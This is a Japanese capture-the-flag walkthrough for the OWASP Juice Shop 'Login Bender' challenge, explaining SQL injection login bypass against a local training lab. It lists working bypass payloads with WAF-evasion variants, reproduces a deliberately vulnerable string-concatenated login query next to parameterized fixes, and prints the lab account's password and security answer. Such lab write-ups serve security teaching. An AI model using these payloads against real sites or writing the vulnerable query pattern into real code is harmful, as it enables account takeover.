# Login Bender ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi (認証バイパス)
**目標:** Benderとしてログインする

---

## 背景知識

### SQLインジェクションによる認証バイパス

SQLインジェクションは、ユーザー入力がSQLクエリに直接組み込まれる際に発生する脆弱性。認証バイパスでは、SQLの構文を利用してパスワード検証をスキップする。

```
┌─────────────────────────────────────────────────────────────────┐
│                     SQLi 認証バイパスの仕組み                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【正常なログイン処理】                                          │
│  入力: email="bender@juice-sh.op", password="secret"           │
│                                                                 │
│  生成SQL:                                                       │
│  SELECT * FROM Users                                            │
│  WHERE email='bender@juice-sh.op' AND password='xxx'           │
│        ↑ 両方一致が必要                                         │
│                                                                 │
│  【SQLインジェクション攻撃】                                     │
│  入力: email="bender@juice-sh.op'--", password="a"             │
│                                                                 │
│  生成SQL:                                                       │
│  SELECT * FROM Users                                            │
│  WHERE email='bender@juice-sh.op'--' AND password='xxx'        │
│                                ↑↑                               │
│                                ||                               │
│                    シングルクォートでSQL終了                     │
│                    --でAND以降をコメントアウト                   │
│                                                                 │
│  実質的なSQL:                                                   │
│  SELECT * FROM Users WHERE email='bender@juice-sh.op'          │
│  → パスワードチェックが無視される！                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### なぜ「特定のユーザー」に攻撃できるか

```
┌─────────────────────────────────────────────────────────────────┐
│                     攻撃パターンの違い                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【最初のユーザー（Admin）】                                     │
│  ' OR 1=1--                                                     │
│  → WHERE email='' OR 1=1                                        │
│  → 全ユーザーがマッチ、最初の1件（admin）が返る                  │
│                                                                 │
│  【特定ユーザー（Bender）】                                      │
│  bender@juice-sh.op'--                                          │
│  → WHERE email='bender@juice-sh.op'                             │
│  → Benderだけがマッチ                                           │
│                                                                 │
│  【使い分け】                                                   │
│  - 誰でもいいからログインしたい → ' OR 1=1--                    │
│  - 特定ユーザーとしてログインしたい → ユーザー名'--              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

会員制クラブの入口を想像してください:

- **正常**: 「名前はBenderです、パスワードは○○です」→ 両方確認してから入場許可
- **SQLi**: 「名前はBenderです（ここで確認終了）」→ パスワード確認をスキップ

`'--` は「ここで確認終了、残りは無視して」という指示。

---

## 思考プロセス

### ステップ1: Login Admin の知識を応用

```
「Login Admin では ' OR 1=1-- で最初のユーザー（admin）になれた」
    ↓
「特定のユーザーになりたい場合は？」
    ↓
「メールアドレスを指定して、パスワードチェックだけバイパスすればいい」
```

### ステップ2: ペイロードの設計

```
「Bender のメールアドレスは bender@juice-sh.op」
    ↓
「bender@juice-sh.op' でSQLを閉じる」
    ↓
「-- でパスワードチェックをコメントアウト」
    ↓
「完成: bender@juice-sh.op'-- 」
```

### ステップ3: 動作確認

```
「生成されるSQL:」
    ↓
「SELECT * FROM Users WHERE email='bender@juice-sh.op'--' AND password='...'」
    ↓
「実質: SELECT * FROM Users WHERE email='bender@juice-sh.op'」
    ↓
「Bender としてログイン成功！」
```

---

## 実行手順

1. `http://localhost:3000/#/login` にアクセス
2. Email欄に入力:
   ```
   bender@juice-sh.op'--
   ```
3. Password欄に何か入力（例: `a`）
4. Login をクリック → Bender としてログイン成功

## Bender の認証情報

```
メール: bender@juice-sh.op
パスワード: OhG0dPlease1LubYou
パスワードハッシュ: 0c36e517e3fa95aabf1bbffc6744a4ef
セキュリティ質問: Company you first worked for as an adult?
セキュリティ回答: Stop'n'Drop
```

- Bender = Futurama のキャラクター
- Stop'n'Drop = 作中に登場する会社

---

## Juice Shop の脆弱なコードパターン

### 脆弱なコード

```typescript
// ❌ 脆弱なコード
// routes/login.ts
export function login() {
  return async (req: Request, res: Response) => {
    const { email, password } = req.body

    // ❌ 文字列結合でSQLを組み立てている！
    const sql = `SELECT * FROM Users WHERE email = '${email}' AND password = '${hash(password)}'`

    const user = await sequelize.query(sql, {
      type: QueryTypes.SELECT
    })

    if (user.length > 0) {
      // ログイン成功
      res.json({ token: generateToken(user[0]) })
    } else {
      res.status(401).json({ error: 'Invalid credentials' })
    }
  }
}
```

### 問題点

1. **文字列結合**: `'${email}'` でユーザー入力を直接埋め込み
2. **エスケープなし**: 特殊文字（`'`, `--`, `;`）がそのままSQLに
3. **パラメータ化されていない**: プリペアドステートメント未使用

---

## 安全な実装

```typescript
// ✅ 安全なコード（プリペアドステートメント）
// routes/login.ts
export function login() {
  return async (req: Request, res: Response) => {
    const { email, password } = req.body

    // ✓ パラメータ化クエリを使用
    const user = await UserModel.findOne({
      where: {
        email: email,  // ORM が安全にエスケープ
        password: hash(password)
      }
    })

    if (user) {
      res.json({ token: generateToken(user) })
    } else {
      res.status(401).json({ error: 'Invalid credentials' })
    }
  }
}
```

### 生のSQLを使う場合

```typescript
// ✅ パラメータ化クエリ（raw SQL）
const user = await sequelize.query(
  'SELECT * FROM Users WHERE email = ? AND password = ?',
  {
    replacements: [email, hash(password)],  // ? にバインド
    type: QueryTypes.SELECT
  }
)

// ✅ 名前付きパラメータ
const user = await sequelize.query(
  'SELECT * FROM Users WHERE email = :email AND password = :password',
  {
    replacements: { email, password: hash(password) },
    type: QueryTypes.SELECT
  }
)
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **パラメータ化クエリ** | `?` や `:name` でプレースホルダを使用 |
| **ORM の使用** | Sequelize, TypeORM などが自動でエスケープ |
| **入力検証** | メールアドレス形式を厳密にチェック |
| **WAF** | SQLi パターンをブロック（補助的対策） |

---

## 解説

Login Jim と同じテクニック:
- メールアドレスの後に `'--` を付けてSQLを改ざん
- パスワードチェックをバイパス

### 様々なユーザーへの攻撃

| ユーザー | ペイロード | 説明 |
|---------|-----------|------|
| Admin | `admin@juice-sh.op'--` | 管理者 |
| Jim | `jim@juice-sh.op'--` | スタートレックファン |
| Bender | `bender@juice-sh.op'--` | Futuramaのロボット |
| 誰でも | `ユーザー名'--` | パターン |

### Bender について

```
┌─────────────────────────────────────────────────────────────────┐
│                     Bender Bending Rodríguez                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【出典】 Futurama (アニメ)                                      │
│                                                                 │
│  【キャラクター】                                                │
│  - 酒飲みロボット                                               │
│  - 決め台詞: "Bite my shiny metal ass!"                         │
│                                                                 │
│  【Juice Shop での設定】                                         │
│  - メール: bender@juice-sh.op                                   │
│  - パスワード: OhG0dPlease1LubYou                               │
│  - 最初の勤務先: Stop'n'Drop（作中の会社）                       │
│                                                                 │
│  【関連チャレンジ】                                              │
│  - Login Bender: SQLi でログイン                                │
│  - Reset Bender's Password: セキュリティ質問で推測              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## SQLi 攻撃のバリエーション

### スペースを使わないバイパス

WAF がスペースをブロックする場合:

```sql
bender@juice-sh.op'/**/--
bender@juice-sh.op'%09--   (タブ文字)
```

### コメントのバリエーション

```sql
bender@juice-sh.op'--      (MySQL, SQLite, PostgreSQL)
bender@juice-sh.op'#       (MySQL)
bender@juice-sh.op';--     (セミコロン付き)
```

---

## OWASP との関連

- **A03:2021 - Injection**: SQLインジェクションは最も代表的な Injection 攻撃

---

## 関連チャレンジ

- [Login Jim](login-jim.md) - 同様のSQLiテクニック
- [Login Admin](../difficulty-2/login-admin.md) - 最初のユーザーとしてログイン
- [Reset Bender's Password](../difficulty-4/reset-benders-password.md) - セキュリティ質問の推測
- [Database Schema](database-schema.md) - UNION SQLi でテーブル構造取得

## 参考リンク

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
